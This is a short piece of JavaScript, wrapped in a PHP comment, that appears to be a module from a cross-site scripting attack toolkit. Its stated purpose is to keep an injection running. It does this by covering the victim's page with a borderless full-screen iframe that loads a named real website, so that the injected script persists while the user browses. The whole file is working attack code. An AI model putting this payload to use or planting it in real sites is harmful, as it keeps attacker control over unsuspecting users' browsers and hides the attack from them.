<?php
# removes document body and replaces it with and iframe of the same document.
# this keeps the injection runing.
?>
debug("begin frame_me");



var xssif = xssce("iframe");
xssif.id="xssiframe";
xsssa(xssif, "position", "absolute");
xsssa(xssif, "style", "width:100%;height:100%;top:0;left:0;border:none;background:#fff;margin:0;padding:0;overflow:hidden");
xsssa(xssif, "src", "http://www.bodybuilding.com/");
xsssa(xssif, "frameborder", "0");
//xsssa(xssif, "width", "100%");
xsssa(xssif, "scrolling", "no");
//xsssa(xssif, "onLoad", "xssCalcHeight();");

xssd=document.getElementsByTagName("body")[0];
xssd.appendChild(xssif);

debug("Frame injection complete");
